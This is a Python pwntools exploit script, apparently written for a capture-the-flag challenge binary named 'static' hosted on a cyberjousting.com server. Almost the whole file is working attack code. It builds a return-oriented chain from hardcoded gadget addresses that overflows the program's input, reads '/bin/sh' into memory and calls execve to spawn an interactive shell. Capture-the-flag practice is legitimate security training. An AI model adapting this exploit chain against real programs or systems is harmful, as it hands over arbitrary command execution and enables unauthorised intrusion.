from pwn import *
from icecream import ic

elf = exe = ELF("./static")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("static.chal.cyberjousting.com", 1350)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x401801
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

#--------Addresses--------#

pop_rax = 0x000000000041069c
pop_rdi = 0x0000000000401fe0
pop_rsi = 0x00000000004062d8
pop_rdx_rbx = 0x000000000045e467
syscall = 0x0000000000401194

bss = 0x000000000049f180
read = 0x410440

#--------ret2syscall--------#

offset = 18

payload = flat(
    b"e" * offset,
    # Round 1: call read(0, bss, 0x8)
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx_rbx, 8, 0,
    read,
    # Round 2: call execve("/bin/sh", 0, 0)
    pop_rax, 59,
    pop_rdi, bss,
    pop_rsi, 0, 
    pop_rdx_rbx, 0, 0,
    syscall,
)

sl(payload)
sl("/bin/sh\x00")
i()
